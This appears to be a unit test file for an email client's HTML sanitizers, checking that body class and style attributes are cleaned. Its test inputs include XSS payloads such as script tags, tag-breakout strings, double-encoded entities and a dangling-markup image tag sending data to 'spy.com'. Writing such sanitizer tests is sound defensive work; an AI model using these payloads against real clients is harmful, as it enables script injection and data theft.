import { protonizer, sanitizeComposerReply } from './purify';

describe('protonizer', () => {
    const getBodyClass = (doc: Element) => doc.querySelector('body')?.getAttribute('class');

    it('should preserve a normal body class attribute', () => {
        const html = '<html><body class="foo bar"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('foo bar');
    });

    it('should preserve body class when value contains script tags', () => {
        const html = '<html><body class="my-class <script>alert(1)</script> other-class"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyClass = getBodyClass(result);
        expect(bodyClass).not.toContain('<script>');
        expect(bodyClass).not.toContain('</script>');
        expect(bodyClass).toContain('my-class');
        expect(bodyClass).toContain('other-class');
    });

    it('should preserve body class when value contains closing script tag', () => {
        const html = '<html><body class="pre</script>post"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('pre post');
    });

    it('should preserve body class when value contains noscript tags', () => {
        const html = '<html><body class="cls</noscript>other"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('cls other');
    });

    it('should preserve body class when value contains iframe tags', () => {
        const html = '<html><body class="a</iframe>b"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('a b');
    });

    it('should preserve body class when value contains SGML delimiter -->', () => {
        const html = '<html><body class="a-->b"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('a b');
    });

    it('should strip double-encoded HTML entities that hide script tags', () => {
        const html =
            '<html><body class="cls &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; other"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyClass = getBodyClass(result);
        expect(bodyClass).not.toContain('<script>');
        expect(bodyClass).not.toContain('</script>');
        expect(bodyClass).toContain('cls');
        expect(bodyClass).toContain('other');
    });

    it('should strip script tags from class even when they are the only content', () => {
        const html = '<html><body class="<script>alert(1)</script>"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyClass = getBodyClass(result);
        expect(bodyClass).not.toContain('<script>');
        expect(bodyClass).not.toContain('</script>');
    });

    it('should strip dangling markup with unclosed tags from body class', () => {
        const html = `<html><body class="class-pre &quot;&gt;&lt;img src='https://spy.com?whoami="><p>Hello</p></body></html>`;
        const result = protonizer(html, true);
        const bodyClass = getBodyClass(result);
        expect(bodyClass).not.toContain('img');
        expect(bodyClass).not.toContain('spy.com');
        expect(bodyClass).not.toContain('"');
        expect(bodyClass).not.toContain('>');
        expect(bodyClass).toContain('class-pre');
    });

    it('should handle body with no class attribute', () => {
        const html = '<html><body><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBeNull();
    });
});

describe('protonizer - body style sanitization', () => {
    const getBodyStyle = (doc: Element) => doc.querySelector('body')?.getAttribute('style');

    it('should preserve a normal body style attribute', () => {
        const html = '<html><body style="color: red; font-size: 14px;"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyStyle(result)).toContain('color: red');
        expect(getBodyStyle(result)).toContain('font-size: 14px');
    });

    it('should strip script tags injected inside body style', () => {
        const html = '<html><body style="color: red;<script>alert(1)</script>"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        expect(bodyStyle).not.toContain('<script>');
        expect(bodyStyle).not.toContain('alert');
        expect(bodyStyle).toContain('color: red');
    });

    it('should strip closing tags injected inside body style', () => {
        const html = '<html><body style="color: red;</style>"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        expect(bodyStyle).not.toContain('</style>');
        expect(bodyStyle).toContain('color: red');
    });

    it('should strip SGML delimiter --> from body style', () => {
        const html = '<html><body style="color: red;-->"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        expect(bodyStyle).not.toContain('-->');
    });

    it('should strip double quotes decoded from entities in body style', () => {
        const html = '<html><body style="color: red; &amp;quot;&amp;gt; injected"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        expect(bodyStyle).not.toContain('"');
        expect(bodyStyle).not.toContain('>');
        expect(bodyStyle).toContain('color: red');
    });

    it('should strip single quotes from body style values', () => {
        const html = `<html><body style="color: red; '>injected"><p>Hello</p></body></html>`;
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        expect(bodyStyle).not.toContain("'>");
    });

    it('should filter out non-CSS declarations', () => {
        const html = '<html><body style="color: red; not-valid-at-all; font-size: 14px;"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        expect(bodyStyle).toContain('color: red');
        expect(bodyStyle).toContain('font-size: 14px');
        expect(bodyStyle).not.toContain('not-valid-at-all');
    });

    it('should keep CSS custom properties (double-dash variables)', () => {
        const html = '<html><body style="--my-var: blue; color: red;"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        expect(bodyStyle).toContain('--my-var: blue');
        expect(bodyStyle).toContain('color: red');
    });

    it('should strip dangling markup with unclosed tags from body style', () => {
        const html = `<html><body style="color: red; &quot;&gt;&lt;img src='https://spy.com?whoami="><p>Hello</p></body></html>`;
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        expect(bodyStyle).not.toContain('img');
        expect(bodyStyle).not.toContain('spy.com');
        expect(bodyStyle).toContain('color: red');
    });

    it('should strip double-encoded HTML entities hiding tags in body style', () => {
        const html =
            '<html><body style="color: red; &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        expect(bodyStyle).not.toContain('<script>');
        expect(bodyStyle).not.toContain('alert');
        expect(bodyStyle).toContain('color: red');
    });

    it('should not contain any executable content when style has only script injection', () => {
        const html = '<html><body style="<script>alert(1)</script>"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyStyle = getBodyStyle(result);
        if (bodyStyle) {
            expect(bodyStyle).not.toContain('<script>');
            expect(bodyStyle).not.toContain('alert');
            expect(bodyStyle).not.toMatch(/[a-z]/i);
        }
    });

    it('should handle body with no style attribute', () => {
        const html = '<html><body><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyStyle(result)).toBeNull();
    });
});

describe('sanitizeComposerReply', () => {
    it('should remove all <style> tags from the input element', () => {
        const input = document.createElement('div');
        input.innerHTML = `
            <style>.example { color: red; }</style>
            <style>.example { color: red; }</style>
            <p>Test content</p>`;

        sanitizeComposerReply(input);

        expect(input.querySelector('style')).toBeNull();
        expect(input.querySelector('p')?.textContent).toBe('Test content');
    });

    it('should return the input element unchanged if there are no <style> tags', () => {
        const input = document.createElement('div');
        input.innerHTML = `<p>Test content</p>`;

        const result = sanitizeComposerReply(input);

        expect(result.querySelector('style')).toBeNull();
        expect(result.querySelector('p')?.textContent).toBe('Test content');
    });

    it('should return the input element as is if it is not queryable', () => {
        const input = document.createTextNode('Text node') as unknown as Element;

        const result = sanitizeComposerReply(input);

        expect(result).toBe(input);
    });

    it('should handle null input gracefully', () => {
        const result = sanitizeComposerReply(null as unknown as Element);

        expect(result).toBeNull();
    });
});
